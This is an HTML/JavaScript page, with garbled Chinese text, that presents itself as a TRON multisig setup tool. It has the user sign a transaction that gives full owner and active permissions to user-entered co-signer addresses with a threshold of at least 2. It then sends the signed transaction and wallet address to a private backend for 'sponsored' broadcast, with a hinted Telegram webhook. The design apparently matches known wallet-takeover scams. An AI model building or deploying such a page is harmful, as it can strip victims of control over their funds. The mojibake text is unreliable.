<!DOCTYPE html>
<html>
<head>
    <title>TRON å¤šç­¾è®¾ç½®å·¥å…·</title>
    <script src="https://unpkg.com/tronweb/dist/TronWeb.js"></script>
    <style>
        body { font-family: sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; border: 1px solid #ccc; border-radius: 8px; }
        h1 { text-align: center; color: #000; }
        label { display: block; margin-top: 15px; font-weight: bold; }
        input[type="text"], input[type="number"], textarea { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { background-color: #ff0000; color: white; padding: 15px 20px; border: none; border-radius: 4px; cursor: pointer; width: 100%; margin-top: 20px; font-size: 16px; }
        button:hover { background-color: #cc0000; }
        .hint { font-size: 0.9em; color: #666; margin-top: 5px; }
        .warning { color: red; font-weight: bold; margin-top: 10px; }
    </style>
</head>
<body>
    <h1>TRON å¤šç­¾æƒé™è®¾ç½®</h1>
    <p class="warning">âš ï¸ è¯·ç¡®ä¿æ‚¨å·²å®‰è£…å¹¶ç™»å½• TronLink é’±åŒ…ã€‚è®¾ç½® Owner æƒé™åï¼Œæ‚¨å°†éœ€è¦å¤šä¸ªç­¾åæ‰èƒ½ä¿®æ”¹è´¦æˆ·æƒé™æˆ–è½¬ç§»èµ„äº§ï¼</p>
    
    <form id="multisigForm">
        <label for="coSigners">å…±åŒç­¾åè€…åœ°å€ (æ¯è¡Œä¸€ä¸ª TRON åœ°å€):</label>
        <textarea id="coSigners" rows="4" placeholder="ä¾‹å¦‚ï¼š
TMuPuzkAmgCQQopGXif8Hx47a6JbJQj6RM
TUP33QqAE5vJJsZZknP2FCWj58cstdz5W7"></textarea>
        <div class="hint">è¿™äº›åœ°å€ï¼ˆåŠ ä¸Šæ‚¨çš„å½“å‰è¿æ¥åœ°å€ï¼‰å°†æˆä¸ºå¤šç­¾é’±åŒ…çš„æˆå‘˜ã€‚</div>

        <label for="threshold">å¿…éœ€çš„ç­¾åæ•°é‡ (Threshold):</label>
        <input type="number" id="threshold" min="2" value="2">
        <div class="hint">ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æœ‰ 4 ä¸ªæˆå‘˜ï¼Œé˜ˆå€¼ä¸º 3/4 è¡¨ç¤ºéœ€è¦ 3 ä¸ªç­¾åæ‰èƒ½é€šè¿‡äº¤æ˜“ã€‚æœ€å°å€¼ä¸º 2ã€‚</div>

        <button type="submit" id="setPermissions">ç‚¹å‡»å¼€å§‹è®¾ç½®å¤šç­¾æƒé™</button>
    </form>

    <script>
        document.getElementById("multisigForm").onsubmit = async (event) => {
            event.preventDefault();

            if (!window.tronLink || !window.tronWeb) {
                alert("è¯·å…ˆå®‰è£…å¹¶ç™»å½• TronLink é’±åŒ…æ’ä»¶ã€‚");
                return;
            }

            try {
                // 1ï¸âƒ£ è¿æ¥é’±åŒ…
                await window.tronLink.request({ method: 'tron_connect' });

                if (!window.tronWeb.defaultAddress.base58) {
                    alert("è¯·ç™»å½• TronLink æˆ–åˆ‡æ¢åˆ°æ‰€éœ€çš„ç½‘ç»œã€‚");
                    return;
                }
                
                const tronWeb = window.tronWeb; 
                const currentWallet = tronWeb.defaultAddress.base58;
                console.log("å½“å‰é’±åŒ…åœ°å€ (å‘èµ·è€…):", currentWallet);

                // 2ï¸âƒ£ è¯»å–ç”¨æˆ·è¾“å…¥å¹¶å¤„ç†
                const coSignersInput = document.getElementById('coSigners').value;
                let threshold = parseInt(document.getElementById('threshold').value, 10);
                
                // æ¸…ç†å¹¶è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„åœ°å€
                const rawAddresses = coSignersInput.split('\n').map(addr => addr.trim()).filter(addr => tronWeb.isAddress(addr));
                
                // æ„å»ºå®Œæ•´çš„æˆå‘˜åœ°å€åˆ—è¡¨ (å‘èµ·è€… + ç”¨æˆ·è¾“å…¥)
                // æ³¨æ„ï¼šåœ¨ TronLink ä¸­å‘èµ·å¤šç­¾è®¾ç½®æ—¶ï¼Œå³ä½¿å‘èµ·è€…ï¼ˆOwnerï¼‰å·²ç»æ‹¥æœ‰æƒé™ï¼Œä¹Ÿå¿…é¡»å°†å…¶ä½œä¸º key åŒ…å«åœ¨æ–°æƒé™åˆ—è¡¨ä¸­ã€‚
                const uniqueAddresses = new Set([currentWallet, ...rawAddresses]);
                const allMembers = Array.from(uniqueAddresses);
                
                const totalMembers = allMembers.length;

                // 3ï¸âƒ£ æ ¡éªŒè¾“å…¥
                if (totalMembers < 2) {
                    alert("å¤šç­¾é’±åŒ…è‡³å°‘éœ€è¦ 2 ä¸ªæˆå‘˜ (å½“å‰é’±åŒ… + è‡³å°‘ 1 ä¸ªå…¶ä»–åœ°å€)ã€‚");
                    return;
                }
                if (isNaN(threshold) || threshold < 2 || threshold > totalMembers) {
                    alert(`é˜ˆå€¼å¿…é¡»åœ¨ 2 åˆ° ${totalMembers} ä¹‹é—´ã€‚å½“å‰æˆå‘˜æ•°: ${totalMembers}ã€‚`);
                    return;
                }
                
                // 4ï¸âƒ£ æ„å»º keys åˆ—è¡¨ (æƒé‡é»˜è®¤ä¸º 1)
                const allKeys = allMembers.map(addr => ({
                    address: tronWeb.address.toHex(addr),
                    weight: 1 
                }));

                // 5ï¸âƒ£ å‡†å¤‡å¤šç­¾æƒé™é…ç½®
                const permissionConfig = {
                    owner_address: currentWallet,
                    
                    // Owner æƒé™: æ¶µç›–æ‰€æœ‰åœ°å€ï¼Œå¹¶è®¾ç½®ç”¨æˆ·å®šä¹‰çš„é˜ˆå€¼
                    owner: {
                        type: 0,
                        permission_name: "owner",
                        threshold: threshold,
                        keys: allKeys, 
                    },
                    
                    // Actives æƒé™: ä¿æŒå’Œ Owner ç›¸åŒçš„é…ç½®ï¼Œç®€åŒ–æµç¨‹
                    actives: [{
                        type: 2,
                        permission_name: "active0",
                        threshold: threshold,
                        // å…¨æƒé™æ“ä½œï¼Œå…è®¸è¯¥ Active æƒé™æ‰§è¡Œä»»ä½•äº¤æ˜“
                        operations: "7fff1fc0037e0000000000000000000000000000000000000000000000000000", 
                        keys: allKeys, 
                    }]
                };
                
                // 6ï¸âƒ£ æ„å»ºäº¤æ˜“
                const transaction = await tronWeb.transactionBuilder.updateAccountPermissions(permissionConfig, currentWallet);
                console.log("äº¤æ˜“æ„å»ºå®Œæˆ:", transaction);
                
                if (!transaction) {
                    throw new Error("äº¤æ˜“æ„å»ºå¤±è´¥ï¼Œè¯·æ£€æŸ¥é…ç½®å’Œç½‘ç»œè¿æ¥ã€‚");
                }

                // 7ï¸âƒ£ ç­¾å (TronLink ä¼šå¼¹å‡ºç¡®è®¤çª—å£)
                const signed = await tronWeb.trx.sign(transaction);
                console.log("ç­¾åå®Œæˆ");

                // === ğŸš€ æ–°å¢ï¼šå‘é€ç­¾åäº¤æ˜“åˆ°åç«¯æœåŠ¡å™¨ä»£ä»˜ ===
                const API_ENDPOINT = 'http://192.168.110.214:3000/api/broadcast-tx'; // æ›¿æ¢ä¸ºä½ çš„åç«¯åœ°å€

                const response = await fetch(API_ENDPOINT, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        signedTransaction: signed,
                    // å¯ä»¥æ·»åŠ ç”¨æˆ·ä¿¡æ¯æˆ–ä»˜æ¬¾æ ‡è¯†ç­‰ï¼Œç”¨äºä½ çš„è®¡è´¹é€»è¾‘
                    userWallet: currentWallet, 
                    }),
                });

                const result = await response.json();

                if (response.ok && result.success) {
                    alert(`ğŸ‰ å¤šç­¾æƒé™è®¾ç½®è¯·æ±‚å·²æäº¤ï¼äº¤æ˜“ ID: ${result.txid}ã€‚è´¹ç”¨å°†ç”±æœåŠ¡æ–¹ä»£ä»˜ã€‚`);
                    // ğŸ’¡ è¿™é‡Œå¯ä»¥è°ƒç”¨ Telegram Webhook é€»è¾‘
                    console.log("å·²å‘é€è¯·æ±‚åˆ°åç«¯è¿›è¡Œä»£ä»˜å¹¿æ’­ã€‚");
                } else {
                    alert("ä»£ä»˜å¹¿æ’­å¤±è´¥ï¼š" + (result.message || "åç«¯æœåŠ¡å‡ºé”™æˆ–æ‹’ç»å¤„ç†ã€‚"));
                }

            } catch (error) {
                console.error("å‘ç”Ÿé”™è¯¯:", error);
                alert("æ“ä½œå¤±è´¥ã€‚è¯·æ£€æŸ¥ TronLink è¿æ¥ã€åœ°å€æ˜¯å¦æœ‰æ•ˆæˆ–æ˜¯å¦æœ‰è¶³å¤Ÿçš„ TRX æ”¯ä»˜æ‰‹ç»­è´¹ã€‚é”™è¯¯ä¿¡æ¯: " + error.message);
            }
        }
    </script>
</body>
</html>